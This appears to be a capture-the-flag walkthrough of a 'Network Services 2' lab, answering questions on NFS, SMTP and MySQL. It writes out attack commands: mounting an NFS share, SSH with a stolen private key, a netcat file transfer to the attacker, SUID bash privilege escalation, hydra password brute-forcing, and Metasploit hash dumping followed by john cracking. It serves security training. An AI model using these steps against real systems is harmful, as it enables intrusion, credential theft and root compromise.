# Network Services 2

- Ready? Let's get going!

	  no answer needed

- What does NFS stand for?

	- `Network File System`

- What process allows an NFS client to interact with a remote directory as though it was a physical device?

	- `Mounting`

- What does NFS use to represent files and directories on the server?

	- `file handle`

- What protocol does NFS use to communicate between the server and client?

	- `rpc`

- What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1 / parameter 2

	- `user id / group id`

- Can a Windows NFS server share files with a Linux client? (Y/N)

	- `Y`

- Can a Linux NFS server share files with a MacOS client? (Y/N)

	- `Y`

- What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research.

	- `*.2`

- Conduct a thorough port scan scan of your choosing, how many ports are open?

	- `nmap -p- -A <TARGET_IP>`
	- `*`

- Which port contains the service we're looking to enumerate?

	- `****`

- Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?

	- `/****`

- what is the name of the folder inside?

	- `sudo mount -t nfs <TARGET_IP>:/**** /tmp/mount -nolock`
	- `*********`

- Have a look inside this directory, look at the files. Looks like  we're inside a user's home directory...

	  no answer needed

- Interesting! Let's do a bit of research now, have a look through the folders. Which of these folders could contain keys that would give us remote access to the server?

	- `.ssh`

- Which of these keys is most useful to us?

	- `id_rsa`

- Can we log into the machine using ssh -i <key-file> <username>@<ip> ? (Y/N)

	- `chmod 600 id_rsa`
	- `ssh -i id_rsa *********@<TARGET_IP>`
	- `Y`

- First, change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user's home directory.

	  no answer needed

- Download the bash executable to your Downloads directory. Then use "cp ~/Downloads/bash ." to copy the bash executable to the NFS share. The copied bash shell must be owned by a root user, you can set this using "sudo chown root bash"

	  no answer needed

	- On your machine `nc -lnvp 4444 > bash`
	- On target `nc <YOUR_IP> 4444 < /bin/bash`
	- `sudo chown root bash`

- What letter do we use to set the SUID bit set using chmod?

	- `s`, remember also `x`.

- What does the permission set look like? Make sure that it ends with -sr-x.

	- `-rwsr-sr-x`

- The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.

	  no answer needed

- Great! If all’s gone well you should have a shell as root! What’s the root flag?

	- `********************`

- What does SMTP stand for?

	- `Simple Mail Transfer Protocol`
	
- What does SMTP handle the sending of?

	- `emails`

- What is the first step in the SMTP process?

	- `SMTP handshake`

- What is the default SMTP port?

	- `25`

- Where does the SMTP server send the email if the recipient's server is not available?

	- `smtp queue`

- On what server does the Email ultimately end up on?

	- `pop/imap`

- Can a Linux machine run an SMTP server? (Y/N)

	- `Y`

- Can a Windows machine run an SMTP server? (Y/N)

	- `Y`

- First, lets run a port scan against the target machine, same as last time. What port is SMTP running on?

	- `nmap -A -p- <TARGET_IP>`
	- `**`

- Okay, now we know what port we should be targeting, let's start up Metasploit. What command do we use to do this?

	- `msfconsole`

- Let's search for the module `smtp_version`, what's it's full module name?

	- `search smtp_version`
	- `************/********/smtp/smtp_version`

- Great, now- select the module and list the options. How do we do this?

	- `options`

- Have a look through the options, does everything seem correct? What is the option we need to set?

	- `rhosts`

- Set that to the correct value for your target machine. Then run the exploit. What's the system mail name?

	- `polosmtp.****`

- What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research.

	- `*******`

- Good! We've now got a good amount of information on the target system to move onto the next stage. Let's search for the module `smtp_enum`, what's it's full module name?

	- `search smtp_enum`
	- `**********/*******/smtp/smtp_enum`

- What option do we need to set to the wordlist's path?

	- `user_file`

- Once we've set this option, what is the other essential paramater we need to set?

	- `RHOSTS`

- Now, set the THREADS parameter to 16 and run the exploit, this may take a few minutes, so grab a cup of tea, coffee, water. Keep yourself hydrated!

	  no answer needed

- Okay! Now that's finished, what username is returned?

	- `******************`

- What is the password of the user we found during our enumeration stage?

	- `hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV <TARGET_IP> ssh`
	- `**********`

- Great! Now, let's SSH into the server as the user, what is contents of smtp.txt

	- `ssh USERNAME@<TARGET_IP>`
	- `cat smtp.txt`
	- `******************************************`

- What type of software is MySQL?

	- `relational database management system`

- What language is MySQL based on?

	- `sql`

- What communication model does MySQL use?

	- `client-server`

- What is a common application of MySQL?

	- `back end database`

- What major social network uses MySQL as their back-end database? This will require further research.

	- `Facebook`

- As always, let's start out with a port scan, so we know what port the service we're trying to attack is running on. What port is MySQL using?

	- `nmap -a -p- <TARGET_IP>`
	- `3***`

- Good, now- we think we have a set of credentials. Let's double check that by manually connecting to the MySQL server. We can do this using the command "mysql -h [IP] -u [username] -p"

	  no answer needed


- Okay, we know that our login credentials work. Lets quit out of this session with "exit" and launch up Metasploit.

	  no answer needed

- We're going to be using the `mysql_sql` module. Search for, select and list the options it needs. What three options do we need to set? (in descending order).

	- `password/rhosts/username`

- Run the exploit. By default it will test with the "select module()" command, what result does this give you?

	- `*.7.29-0ubuntu0.**.**.*`

- Great! We know that our exploit is landing as planned. Let's try to gain some more ambitious information. Change the "sql" option to "show databases". how many databases are returned?

	- `set sql show databases`
	- `run`
	- `*`

- First, let's search for and select the "mysql_schemadump" module. What's the module's full name?

	- `**********/*******/mysql/mysql_schemadump`

-  Great! Now, you've done this a few times by now so I'll let you take it from here. Set the relevant options, run the exploit. What's the name of the last table that gets dumped?

	- `x$waits_global_**_********`

- Awesome, you have now dumped the tables, and column names of the whole database. But we can do one better... search for and select the `mysql_hashdump` module. What's the module's full name?

	- `**********/*******/mysql/mysql_hashdump`

- Again, I'll let you take it from here. Set the relevant options, run the exploit. What non-default user stands out to you?

	- `Carl`

- What is the user/hash combination string?

	- `Carl:*EA031893AA21444B17**************************`

- Now, we need to crack the password! Let's try John the Ripper against it using: "john hash.txt" what is the password of the user we found? 

	- `******`

- What's the contents of MySQL.txt

	- `ssh USER@<TARGET_IP>`, `yes` and enter the password.
	- `ls`
	- `cat MySQL.txt`
	- `**********************************************`

- Congratulations! You did it!

	  no answer needed



